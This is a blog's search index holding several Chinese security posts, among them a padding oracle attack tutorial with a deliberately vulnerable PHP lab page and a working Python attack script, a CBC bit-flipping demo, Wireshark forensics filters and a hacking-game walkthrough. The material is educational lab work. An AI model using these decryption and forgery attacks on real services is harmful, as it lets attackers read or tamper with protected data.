<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Grey Hack 单人模式游戏攻略（1）]]></title>
    <url>%2F2018%2F12%2F31%2FGreyHack-1%2F</url>
    <content type="text"><![CDATA[如何破解wifi，如何获取黑客服务器商店地址 grey hack 单人模式攻略（一）如何破解wifi正常情况下，第一次进入单人模式是没有联网，并且桌面也不会有Gift.txt（wifi密码）的。这里来讲一下游戏中如何破解wifi密码，连入网络 在游戏左上角的Help中，存放着一些游戏帮助，里面有简单的Linux基础知识（Getting started）和一些Linux基础命令（Basic Commands），这里需要自行学习 下面来一遍介绍网络命令（Network Commands），一边操作破解wifi密码 1、airmon该命令用来将指定借口设置成监听模式（类似于现实中将网卡设定成混杂模式） 现在我们将eth0网卡开启监听模式 2、iwlist显示电脑中所有可使用的wifi列表。其中BSSID是wifi的MAC地址，ESSID是wifi名称，PWR是wifi的信号强度。 现在我们来看一下可以接收到的wifi列表 3、aireplayaireplay用来对指定wifi进行抓包。最少要求ACKs包（有效包）大于7000时，才能使用Ctrl+C停止抓包。wifi信号越强，抓到ACKs包的效率越高。现实中是抓到握手包即可，不论包的个数。 现在我们开始抓包 现在ACKs包个数大于7000，按Ctrl+C停止抓包 4、aircrack抓包完成之后，会在 /home/用户名 目录下生成一个file.cap文件。aircrack命令用来破解file.cap文件的密码，即wifi密码 下面来破解file.cap文件的密码 5、连接wifi上面一步已经得到wifi密码了，下面当然是使用密码连入wifi咯 6、注册账号连上wiif之后，第一件事肯定是上网。双击打开Browser，使用浏览器搜索并注册邮箱、银行账户。之后访问商店 银行账户注册完成后，默认只有125美元 邮箱账户注册完成后，会收到一封邮件，让你去得到一个邮箱账户的密码。得到后，将密码发给他，他会告诉你一个可以接任务的地方，同时里面还有一些黑客工具 如何获取黑客服务器商店地址1、whois先使用whois命令查询指定IP的相关信息。现实中的whois实际上是根据域名查询IP地址、所属人相关信息。 发现了域名 antersono.com，属于Stephanie Manna这个人，它的邮件地址是Manna@cigna.com，电话是443547121。 经过尝试，这个域名并不能进行访问。而游戏中也不能使用电话，所以要从邮件地址入手。 2、发送社工邮件我们可以向管理员邮箱Manna@cigna.com发送一封社工邮件（Mail中的Login issues模板），告诉他我们是169.128.57.57这台服务器上的用户Shalne Irbac，忘记了密码，希望管理员告诉我们密码。 邮件发送出去后，会立即收到一封回信，里面告诉了我们该用户的ssh账号密码 3、登录服务器接下来我们使用账号密码登录ssh 在Config目录下有一个Mail.txt文件，里面存储着该用户的邮箱账号及密码哈希，将其保存到本地。 除此之外，还可以查看Config/Bank.txt文件，里面是该用户的银行账号及密码哈希，也保存到本地 4、提权至root实际上一台服务器中可能存在多个用户，但只有root用户才是最高权限，可以查看其他用户的信息，所以我们来查看/etc/passwd文件，得到root用户的密码哈希 然后将之前邮件中附带的decipher程序下载下来，保存到bin目录下 将passwd文件中root用户的密码哈希保存到文件中，使用decipher进行破解（注意，这里需要再另外开启一个终端） 回到ssh连接，使用sudo命令切换到root用户 5、获取其余人信息此时我们已经是root用户了，可以为所欲为了。查看/home目录，发现有两个用户 我们去查看另外一个用户的配置文件 得到了另一个用户的邮箱账号和银行账号。 接下来将这些保存到本地，并使用decipher进行破解得到密码。最后将指定邮箱账户的密码发送回去便可得到黑客服务的地址。不要忘了他们银行账户中的钱转入我们的银行账户哦。]]></content>
      <categories>
        <category>game</category>
      </categories>
      <tags>
        <tag>GreyHack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CBC字节反转攻击原理]]></title>
    <url>%2F2018%2F11%2F19%2FCBC-reverse%2F</url>
    <content type="text"><![CDATA[网上找的一些CBC字节翻转攻击原理 CBC字节翻转攻击原理1976年，IBM发明了密码分组链接（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。CBC是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。 Plaintext：待加密的数据。 IV：初始化向量，用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。 Ciphertext：加密后的数据。 Key：密钥 CBC加密过程 在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。 因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）： Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块 Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块 注意：正如你所见，前一块的密文用来产生后一块的密文。 加密过程转化成文字来叙述： 首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。 生成一个随机的初始化向量(IV)和一个密钥。 将IV和第一组明文异或。 用密钥对3中xor后产生的密文加密。 用4中产生的密文对第二组明文进行xor操作。 用密钥对5中产生的密文加密。 重复4-7，到最后一组明文。 将IV和加密后的密文拼接在一起，得到最终的密文。 CBC解密过程 这是解密过程，解密的过程其实只要理解了加密，反过来看解密过程就也很简单了，同样的，前一块密文参与下一块密文的还原。 从密文中提取出IV，然后将密文分组。 使用密钥对第一组的密文解密，然后和IV进行xor得到明文。 使用密钥对第二组密文解密，然后和2中的密文xor得到明文。 重复2-3，直到最后一组密文。 Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块 Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块 注意：Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！You got it?别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击： 注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。 此攻击方法的精髓在于：通过损坏密文字节来改变明文字节。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。 一个php例子12345678910111213141516171819202122232425262728&lt;?phpdefine(&apos;MY_AES_KEY&apos;, &quot;abcdef0123456789&quot;);function aes($data, $encrypt) &#123; $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &apos;&apos;, MCRYPT_MODE_CBC, &apos;&apos;); $iv = &quot;1234567891234567&quot;; mcrypt_generic_init($aes, MY_AES_KEY, $iv); return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);&#125;define(&apos;MY_MAC_LEN&apos;, 40);function encrypt($data) &#123; return aes($data, true);&#125;function decrypt($data) &#123; $data = rtrim(aes($data, false), &quot;\0&quot;); return $data;&#125;$v = &quot;a:2:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo &apos;Hello sdsdsd!&apos;\&quot;;&#125;&quot;;echo &quot;Plaintext before attack: $v\n&quot;;echo &quot;&lt;br&gt;&quot;;$b = array();$enc = array();$enc = @encrypt($v);$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));$b = @decrypt($enc);echo &quot;Plaintext AFTER attack : $b\n&quot;; 查看代码，得到密文后，将密文的第三位异或6后又异或7。 然后我们查看页面输出 可以看到，第19位的值从6变为7，且第一分组全部变化我们将明文每16位为一组，进行分组 a:2:{s:4:”name”; s:6:”sdsdsd”;s:8 :”greeting”;s:20 :”echo ‘Hello sd sdsd!’”;}从代码中看出，异或的是$enc[2]，即第一组的第三位。而第一组密文的修改将影响第二组对应位置的明文发生变化。第二组的第三位原值为6，异或6后为0,0又异或7变为7。所以6会变为7输出到页面上。 然后第一组密文的修改将导致第一组明文全部变化，所以是一堆错乱的字符。]]></content>
      <categories>
        <category>CBC</category>
      </categories>
      <tags>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PaddingOracleAttack原理记录]]></title>
    <url>%2F2018%2F11%2F10%2Fpadding-oracle-attack%2F</url>
    <content type="text"><![CDATA[里面就是一些基本原理以及个人理解 Padding Oracle Attack起因是整理CTF题目时，发现了一道题，所使用的知识点是padding oracle attack，这个攻击以前就听说过，只是还没有学习过，便想借此机会学习一番。奈何readme文档写的太过简单，而其中所给出的脚本使用之后也并不能得到flag。没有办法，只能花费了两天时间从网上搜找相关资料，慢慢研究学习，完善脚本与writeup。 下面步入正题 一、基础知识故名思义，Padding Oracle Attack背后的关键性概念便是加/解密时的填充(Padding)。明文信息可以是任意长度，但是块状加密算法需要所有的信息都由一定数量的数据块组成。为了满足这样的需求，便需要对明文进行填充，这样便可以将它分割为完整的数据块。 CBC密码分组模式我们来看一下CBC（密码分组链接）模式。在CBC模式中，每个明文块（PlainText）先与前一个密文块（CipherText）进行异或，再进行加密（使用key）。在这种方法中，每个密文块都依赖于前面的明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量（IV）进行异或。最后将这n块密文连接起来。 CBC的解密方法则反了过来。先将密文进行解密，然后与前一个密文块进行异或（第一个用IV），得到对应分组的明文。最后再将这n块明文连接起来。 填充规则加密时可以使用多种填充规则，但最常见的填充方式之一是在PKCS#5标准中定义的规则。 PCKS#5的填充方式为：明文的最后一个数据块包含N个字节的填充数据（N取决于明文最后一块的数据长度）。 下面是不同算法所对应的block长度 下图是一些示例，展示了不同长度的单词（FIG、BANANA、AVOCADO、PLANTAIN、PASSIONFRUIT）以及它们使用PKCS#5填充后的结果（在这里，我们假设每个数据块为8字节长） 过程巩固我们来巩固一遍正常情况下的加密和解密过程 加密：先根据所使用的加密算法判断block的大小（一般是8或16字节），根据block的大小来进行分组，最后一个block使用PKCS#5标准填充，这样得到每一块PlainText。然后使用前一块明文（第一个需使用IV）异或，异或后，再使用key和规定的加密算法进行加密，加密完成后，得到CipherText，最后将所有的CipherText连接起来，便是返回的密文了。 解密：根据加密算法得到block的大小，然后进行分组解密得到中间值，中间值与前一组密文（第一个使用IV）异或，异或后得到PlainText，将所有的PlainText连接起来，便是返回的明文了。 二、Padding Oracle Attack攻击原理Padding Oracle Attack是针对CBC链接模式的攻击，和具体的加密算法无关，换句话说，这种攻击方式不是对加密算法的攻击，而是针对算法的使用不当进行的攻击。 攻击者可以根据返回的密文长度来猜测block大小。例：如果返回的长度是24字节，那么block一定不会是16字节，而应该是8字节；如果知晓了加密算法，可以根据上面的对照表来得到block的大小 攻击前提： 攻击者能得到IV和CipherText，并能提交CipherText 攻击者能够触发密文的解密过程，且服务器根据解密结果不同会返回不同的信息 攻击者若能提交IV，便可篡改明文。 服务器的处理与返回假设我们向服务器提交了正确的密码，我们的密码在经过CBC模式加密后传给了服务器，这时服务器会对我们传来的信息尝试解密，如果可以正常解密会返回一个值表示正确，如果不能正常解密则会返回错误。而事实上，判断提交的密文能不能正常解密，第一步就是判断密文最后一组的填充值是否正确，也就是观察最后一组解密得到的结果的最后几位是否符合规范，如果错误将直接返回错误，如果正确，再将解密后的结果与服务器存储的结果比对，判断是不是正确的明文。也就是说服务器一共可能有三种判断结果： 密文不能正常解密（填充错误）； 密文可以正常解密但解密结果不对（填充正确，但得到的明文错误）； 密文可以正常解密并且解密结果比对正确（填充正确，明文正确）； 其中第一种情况与第二三种情况的返回值一定不一样，这就给了我们可乘之机——我们可以利用服务器的返回值判断我们提交的内容能不能正常解密，即判断我们提交的最后一组密文的填充是否符合规范。下面给出了正确与错误的图示 再看一次CBC的解密过程：将CipherText使用key和解密算法解密得到中间值，将中间值与前一组密文（或IV）进行异或得到PlainText。而攻击的前提就是服务器提供CipherText和IV，所以只要我们知道了中间值，便可知道PlainText。这就是Padding Oracle Attack的核心——找出正确的中间值 如何才能找出正确的中间值前面我们说过服务器会根据我们提交的CipherText的解密结果返回不同的三种情况，我们就依据这三种情况（实际上是两种，填充正确和填充不正确）来得到中间值。 我们还是来看上图的例子，假设只有一个block，中间值是不变的，如果我们将IV修改为全0，返回的明文则与中间值完全一样，但这样基本不可能填充正确。我们需要的是最后一位填充0x01，那么经过遍历最后一个字节后发现当最后一字节为0x3C时，页面返回填充正确的结果，即 中间值^0x3C=0x01，中间值=0x01^0x3C=0x3D。 经过上面的步骤便能得到最后一个字节的中间值。得到之后，需要得到倒数第二个字节的中间值，此时将IV的最后一字节变为0x3D^0x02=0x3F，IV的倒数第二个字节进行遍历，发现当倒数第二个字节为0x24时，页面返回填充正确的结果，即 中间值=0x02^0x24=0x26……以此类推，得到完整的中间值。最后将中间值与IV异或，便可得到明文。 上面说的是最简单的情况：只有一个block。当有多个block时，我们从最后一个block入手（因为该算法要先经过key解密得到中间值，而中间值在同一个CipherText下是一定不变的，后面的PlainText受前一个CipherText影响，而前面的PlainText与后面无关，所以需要从后往前走）。单独截取最后一个block，前面一个block填充全0并遍历得到中间值（若有长度限制，必须与正常密文长度相同，则只将到倒数第二个block修改即可）；得到最后一个block的中间值后，将最后一个block舍弃，截取倒数第二个block，前面一个block填充全0并遍历得到中间值（若有长度限制，将倒数第二个block与最后一个block互换位置，互换后的倒数第二个block填充全0并遍历得到中间值）；以此类推，得到所有中间值 我们得到中间值之后，便可得到明文。如果我们还可以控制IV，那么将IV与原明文异或后，再与想得到的明文异或得到新的IV，然后将新的IV提交，便可得到想要的明文。 1234567原理：异或是相同为0，不同为1；0与x异或得到x；IV^中间值=PlainTextIV^中间值^PlainText^PlainTextNew=PlainText^PlainText^PlainTextNew=PlainTextNew其中中间值不变，将IV^PlainText^PlainTextNew后提交即可。这其实就是CBC字节翻转攻击了，具体的原理可以参考其他文章 三、实例为了更好的理解和利用Padding Oracle Attack，我自己编写了一个简单的PHP页面。 主要功能：页面显示加密算法、IV、CipherText，并提供两个提交表单；第一个表单根据提交的cipher返回解密成功或失败；第二个表单要求提交正确的PlainText，然后通过修改iv让PlainText的值变为admin。 流程是先判断提交的plainText是否正确，然后将提交的iv和cipher进行解密，如果解密后得到admin则返回PlainText Changed Success! 页面代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpdefine(&quot;SECRET_KEY&quot;, &quot;thkeyw&quot;); # 加密密钥define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); # 加密算法echo &quot;method:&quot;,METHOD.&quot;&lt;br&gt;&quot;;function get_random_token()&#123; # 生成随机数 $random_token=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $random_token.=chr(rand(1,255)); &#125; return $random_token;&#125;$iv=get_random_token();$plainText=&quot;user&quot;;$cipher=openssl_encrypt($plainText,METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv);echo &quot;iv:&quot;,base64_encode($iv).&quot;&lt;br&gt;&quot;;echo &quot;cipher:&quot;,base64_encode($cipher).&quot;&lt;br&gt;&quot;;?&gt;&lt;div&gt; &lt;p&gt;Try to use Padding Oracle Attack to get plainText first. Put the IV in front of the cipher&lt;/p&gt; &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;p&gt;cipher:&lt;input type=&quot;text&quot; name=&quot;cipher&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;div&gt; &lt;p&gt;Second,give me PlainText and new iv,to make new PlainText to be admin&lt;/p&gt; &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;p&gt;iv:&lt;input type=&quot;text&quot; name=&quot;iv&quot;&gt;&lt;/p&gt; &lt;p&gt;cipher:&lt;input type=&quot;text&quot; name=&quot;cipher&quot;&gt;&lt;/p&gt; &lt;p&gt;plain:&lt;input type=&quot;text&quot; name=&quot;plain&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;?phpif(isset($_POST[&apos;iv&apos;])&amp;&amp;isset($_POST[&apos;plain&apos;])&amp;&amp;isset($_POST[&apos;cipher&apos;]))&#123; # 第二个提交表单，测试CBC字节翻转攻击 if($_POST[&apos;plain&apos;]===$plainText)&#123; $iv_new=base64_decode($_POST[&apos;iv&apos;]); $plainText_new=openssl_decrypt(base64_decode($_POST[&apos;cipher&apos;]),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv_new); if($plainText_new===&apos;admin&apos;)&#123; echo &quot;PlainText Changed Success!&quot;; &#125;else&#123; die(&apos;Let plainText be admin, please!&apos;); &#125; &#125;else&#123; die(&apos;plainText error&apos;); &#125;&#125;elseif(isset($_POST[&apos;cipher&apos;]))&#123; # 第一个提交表单，测试Padding Oracle Attack $cipher_post=base64_decode($_POST[&apos;cipher&apos;]); $ivv=substr($cipher_post,0,16); $cipherr=substr($cipher_post,16); $p=openssl_decrypt($cipherr,METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$ivv); if($p!=&quot;&quot;)&#123; echo &quot;crypt success!&lt;br&gt;&quot;; &#125;else&#123; echo &quot;crypt failed!&lt;br&gt;&quot;; &#125;&#125; 页面显示效果 使用的加密模式是aes-128-cbc，而aes的block大小是16字节，这一点与上面原理部分不同，需要稍稍注意一下。 攻击脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#-*- coding:utf-8 -*-import requests,urllib,base64,reurl=&apos;http://192.168.12.199/test.php&apos;s=requests.session()# 用来进行发包，返回页面结果def inject(var): data=&#123;&apos;cipher&apos;:var&#125; # 必须要用requests，不能用s，因为如果在这里用s，后面循环中会使用，最后会存储一个在break时的值 # 而这个值是错误的，所以这里不能用requests.session。在这里坑了好久 result=requests.post(url,data=data) return result# 字符串异或函数def xor(a,b): ss=&quot;&quot; for i in xrange(len(a)): ss+=chr(ord(a[i])^ord(b[i])) return ss# 使用正则匹配得到页面给出的iv和cipherrepo=s.get(url)iv=re.compile(&quot;iv:(.*?)&lt;br&gt;&quot;).findall(repo.content)[0]cipher=re.compile(&quot;cipher:(.*?)&lt;br&gt;&quot;).findall(repo.content)[0]middle=&quot;&quot; # 中间值# 因16个字节为一组，字符最大到0xff，所以有如下循环# 在进行大批量运算时，xrange比range性能要好for i in xrange(1,17): for j in xrange(0,256): # 根据已经得到的中间值计算下次测试时对应位置的填充值 # 比如已经得到最后一位的中间值，那么计算倒数第二位中间值时，要根据最后一位中间值计算此时最后一位对应的填充值，让明文为0x02 padding=xor(middle,chr(i)*(i-1)) # 前面是0，跟着一字节测试值，跟着已得到中间值所对应的填充值，最后是正常的密文 ever_c=chr(0)*(16-i)+chr(j)+padding+base64.b64decode(cipher) # 判断当前payload是否正常，有可能出现特殊情况 # 比如中间值的倒数第二位本来就是0x02，中间值的倒数第二位计算的结果会先得到0x02，再得到0x01，这种情况下会出错 if len(ever_c)&lt;32: exit(&quot;wrong, please retry&quot;) print ever_c.encode(&apos;hex&apos;) ever_result=inject(base64.b64encode(chr(0)*16+ever_c)) # 判断解密是否正常，正常则得到该位中间值 if &quot;crypt failed&quot; not in ever_result.content: middle=chr(j^i)+middle breakplain=xor(middle,base64.b64decode(iv)) # 明文（包括填充）print &quot;middle:&quot;,middle.encode(&apos;hex&apos;) # 中间值，十六进制方便显示print &quot;plain:&quot;,plainprint &quot;iv:&quot;,ivprint &quot;cipher:&quot;,cipherplainText_new=&apos;admin&apos;+chr(11)*11 # 想要得到的明文iv_new=xor(base64.b64decode(iv),xor(plain,plainText_new)) # 新的iv，提交后便可得到adminprint &quot;iv_new:&quot;,base64.b64encode(iv_new)data=&#123;&apos;plain&apos;:&apos;user&apos;,&apos;iv&apos;:base64.b64encode(iv_new),&apos;cipher&apos;:cipher&#125;print requests.post(url,data=data).content 脚本运行结果： 参考资料http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.htmlhttps://www.freebuf.com/articles/web/15504.htmlhttps://www.freebuf.com/articles/database/151167.htmlhttps://www.csdn.net/article/1970-01-01/289154]]></content>
      <categories>
        <category>CBC攻击</category>
      </categories>
      <tags>
        <tag>PaddingOracleAttack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux挂载Windows共享]]></title>
    <url>%2F2018%2F11%2F10%2Flinux-mount-windows-share%2F</url>
    <content type="text"><![CDATA[如题可以使用1enum4linux 192.168.200.114 扫描是否存在共享 假设windows共享地址为//192.168.200.114/share$ 无需登录的情况映射命令（$需要转义）： 1mount -t cifs -l //192.168.200.114/share\$ /mnt 需要登录的情况映射命令 1mount -t cifs -o username=ge,password=ge -l //192.168.200.114/share\$ /mnt 删除映射命令（退出映射文件夹） 1umount /mnt 如果挂载命令报错 1mount: /mnt: bad option; for several filesystems (e.g nfs, cifs) you might need a /sbin/mount.&lt;type&gt; helper program. 安装一个cifs-utils软件即可。 如果还出错，centos安装nfs-utils samba-client；ubuntu安装nfs-common samba-client 注意，mount/umount命令需要root权限]]></content>
      <categories>
        <category>mount</category>
      </categories>
      <tags>
        <tag>mount</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用wireshark做数据赛]]></title>
    <url>%2F2018%2F07%2F11%2Fwireshark-and-dataGame%2F</url>
    <content type="text"><![CDATA[简单的说一下数据赛 如何使用wireshark做数据赛序章首先来推荐一本书，《Wireshark数据包分析实战（第二版）》，里面详细讲解了网络基础、wireshark的使用分析方法，并以常见的DHCP、TCP、ARP等协议为样例进行分析讲解。这次主要是说一下大致流程，以及一些做题中可能用到的一些小技巧。 显示过滤器显示过滤器完整列表 简单协议说明在做题中，一般都是有http协议，其余常见协议有ssh、telnet、ftp、mysql、snmp、smtp、https、redis等。这其中http、telnet、ftp、redis是明文传输的；smtp是经过base64编码后传输，相当于明文传输；snmp 2.0及以下都是明文传输，3.0以上才是加密传输；mysql登录时密码是密文，其余均是明文；ssh及https是加密传输，https需要有密钥才能得到明文。 渗透套路说明通常情况下，是从内网抓包，抓到黑客通过某个服务（一般是web）拿到某台服务器的shell，经过一系列操作，扫描内网并拿到内网其他机器的权限。 常见问题 黑客执行的第X条命令是啥 黑客拿到XX权限的时间 XXX的账号密码/密码哈希 服务器或黑客的IP/主机名/MAC地址 路由器IP地址/MAC地址 黑客爆破次数 XX文件内容 黑客所使用的工具 CMS名称及版本 shell地址/密码 ……………… 下次出题可以问TCP序号、确认号、客户端连接端口、会话ID，将路由器放在一个不常见IP上，问路由器IP及MAC地址。感觉网络相关的东西还是蛮重要的，顺便略微提升一下难度。 常见坑 由于服务器有内网地址和外网地址之说，所以提交答案时两个都尝试一次 若是询问到登录时间等与时间有关的问题时，要注意时间有两个时间，一个是请求包时间，一个是响应包时间，两个也可以都提交一次 提交答案时左右两侧不要有空格 前面的问题或答案有可能与后面问题有关，要收集整理 看清楚问题，例：端口分为公认端口、注册端口、动态/私有端口，范围不同 做题技巧简单的介绍一些显示过滤器的使用 过滤url中包含ctf的请求 12http.request.uri contains ctfhttp.request.uri matches &quot;ctf&quot; CMS及其版本号 1http contains &quot;Powered by&quot; 寻找菜刀包 1http.request.method==POST 寻找菜刀返回结果 1http contains &quot;-&gt;|&quot; 寻找redis传输内容 1tcp.port eq 6379 寻找反弹shell的传输内容，例：弹回6666端口 1tcp.port eq 6666 mysql进行管理员相关查询 1mysql matches &quot;select.*?user|admin&quot; 其余的小技巧请自行发掘 做题思路首先需要找到题目入口，即找到黑客IP、服务器IP、常见服务等。可以从wireshark的统计中查找大流量，也可以从日志中寻找攻击相关行为。 找到上面信息之后，可以使用如下显示过滤器来只显示黑客相关数据分组 1ip.addr eq 黑客IP 个人认为应以题目答案为导向，但还需要探寻黑客攻击轨迹，进行要点记录，当后面遇到相关题目时，可以从要点中寻找。 前面有说明渗透套路，基本可以按照该顺序寻找黑客攻击线索。]]></content>
      <categories>
        <category>wireshark</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php序列化与反序列化范例]]></title>
    <url>%2F2017%2F11%2F10%2Fphp-serialize%2F</url>
    <content type="text"><![CDATA[之前做CTF题的时候遇到了php反序列化的题，由于本人不太会php反序列化，所以稍微学习了一下，这里做出一个范例 php反序列化范例格式个人认为php序列化后的格式应该是这样的： 类型:长度:{类型1:长度1:值1;类型2:长度2:值2;……} 类型一般有： array->a common object->o string->s integer->i boolean->b double->d reference->r custom object->C null->N pointer reference->R unicode string->U class->O 代码123456789101112131415161718192021222324&lt;?phpclass just4fun&#123; var $secret; var $enter;&#125;# 序列化与反序列化范例$o1=new just4fun(); # 实例化该类$o1-&gt;secret=&apos;aaa&apos;; # 给实例中的一些变量赋值$o1_ser=serialize($o1); # 序列化该实例print_r($o1_ser); # 输出序列化后的内容echo(&quot;\n&quot;); # 输出换行，必须用双引号print_r(unserialize($o1_ser)); # 输出反序列化后的内容 echo(&quot;\n&quot;);echo(&quot;\n&quot;);# 序列化与指向引用的结合使用$o2=new just4fun();$o2-&gt;enter=&amp;$o2-&gt;secret; # 此处的enter的值是引用的secret的值，使用符号：&amp;$o2_ser=serialize($o2);print_r($o2_ser);echo(&quot;\n&quot;);print_r(unserialize($o2_ser));echo(&quot;\n&quot;);?&gt; 输出：12345678910111213141516O:8:&quot;just4fun&quot;:2:&#123;s:6:&quot;secret&quot;;s:3:&quot;aaa&quot;;s:5:&quot;enter&quot;;N;&#125;just4fun Object( [secret] =&gt; aaa [enter] =&gt; )O:8:&quot;just4fun&quot;:2:&#123;s:6:&quot;secret&quot;;N;s:5:&quot;enter&quot;;R:2;&#125;just4fun Object( [secret] =&gt; [enter] =&gt; )[Finished in 0.2s]]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome使用进阶]]></title>
    <url>%2F2017%2F10%2F08%2FChromeAdvanced%2F</url>
    <content type="text"><![CDATA[文章里介绍了一些好用插件和快捷键 Chrome使用进阶插件：Set Character Encoding有的版本的Chrome在更多工具和高级里没有修改编码的选项，这个时候就需要安装这个插件了，使用方法：右击页面，选择需要的编码即可 Tampermonkey俗称“油猴”脚本，用来添加实用脚本的插件，点击后可以查看当前页面使用的脚本，可以开启或关闭。管理面板（仪表盘）——》是用来管理所有安装脚本的。添加新脚本——》是直接添加脚本代码，如果你有好的脚本代码可以使用添加新脚本。获取新脚本——》如果你想要使用别人做好的现成的脚本，就需要点击获取新脚本了。其中最好用的是GreasyFork网站，里面的好用脚本挺多的，像：百度云解除大文件下载限制、在线解析VIP视频、跳过验证码等待、解除页面右键限制等等，刚开始访问起来有点慢，请耐心等候。 Proxy SwitchyOmega很好用的代理工具，可以添加代理，并自己设置代理使用条件 HackBar感觉不如火狐上的好用，凑合使用一下还是可以的 有道云笔记网页简报方便快捷的把网页内容或整个网页保存到有道云笔记中 印象笔记.剪藏同上，保存到印象笔记中 修改HTTP头方便的修改或添加HTTP请求头内容 User-Agent Switcher for Chrome修改User-Agent的插件，17-9-10爆出User-Agent Switcher for Google Chrome是木马，所以换了一个插件使用，以防万一咯。里面自带的种类比较少，可以自己从网上下载User-Agent的xml文件，导入进去：右击——》选项——》左侧Import/Export Settings——》右侧选择文件 Word Highlight谷歌搜索关键字高亮插件 Search the current site提供当前浏览网站的站内搜索功能 AdBlock广告屏蔽，屏蔽youtube广告很厉害 Advertising Terminator也是一个屏蔽广告的插件，据说是广告终结者 IP Whois &amp; Flags Chrome &amp; Websites Rating显示当前浏览网站的IP、Whois信息等 删除谷歌重定向避免谷歌搜索结果链接重定向，同时防止点击追踪 LastPassChrome上最好用的密码管理软件，支持密码自动填充、生成密码 Vimium可以让你抛弃鼠标的一个插件（键盘快捷键） Holmes浏览器书签搜索，快捷键：alt+shift+h Allow Copy允许网页的复制 crxMouse Chrome Gestures鼠标手势 Eye Dropper取色器 Show Password on Focus显示密码框内的密码 RescueTime记录你在每个网站上耗用的时间 WebpageScreenshot最好用的网页截图 OneTab节省打开n多标签页时占用的内存 右键搜扩展右键菜单 Chrono下载管理器接管所有下载 Clear Cache点击图标即可清除缓存、cookie等 Code Cola可视化编辑在线页面CSS样式 WEB前端助手(FeHelper)FE助手：字符串编码解码、图片base64编码、代码压缩、梅花、JSON格式化、正则表达式、时间转换工具、二维码生成器、编码规范检测、页面性能检测、栅格检测、JS运行效率分析 二维码(QR码)生成器(QR Code Generator)给当前页面生成二维码 Markdown Here写邮件、印象|为知笔记在线版编辑文字时，遵循markdown语法编辑文字 Listen 1听音乐用的，很好用，在github上：https://github.com/listen1/listen1 The Great Suspnender大家都知道，Chrome 有个通病，就是当你打开多个标签页的时候，比较占用内存资源。浴室这个插件就派上用场了，安装这个插件之后，你设置一定的时间，比如半小时之后，其他标签页如果没有操作，就会被自动回收，节省内存，而当你再切换回之前标签页的时候，会是一片空白，只需要鼠标点击下自动重新加载。 Similar Web可以知道一个网站的流量、来源、排名、竞争等信息 Grammarly可以帮助英语写作，自动检查一些英语单词的拼写和语法，并直接推荐正确的单词或句子 Stylish为任意网站自定义主题 BuiltWith Technology Profiler能够看到网站使用什么技术写的 Note Anywhere让你在任意网页任意位置上贴上小便签 Search by Image(by Google)通过图片搜索图片：可以再网页上任何的图片身上右击以图搜图 Context Menu SearchChrome右键默认只有Google搜索，这个插件可以使用多个搜索引擎：百度、淘宝、必应、360等 Postman一个相当好用的HTTP请求调试工具，能够发送任何类型的HTTP requests，附带任何数量的参数 Regex Search用正则表达式搜索网页内容 快捷键：windows和Linux的 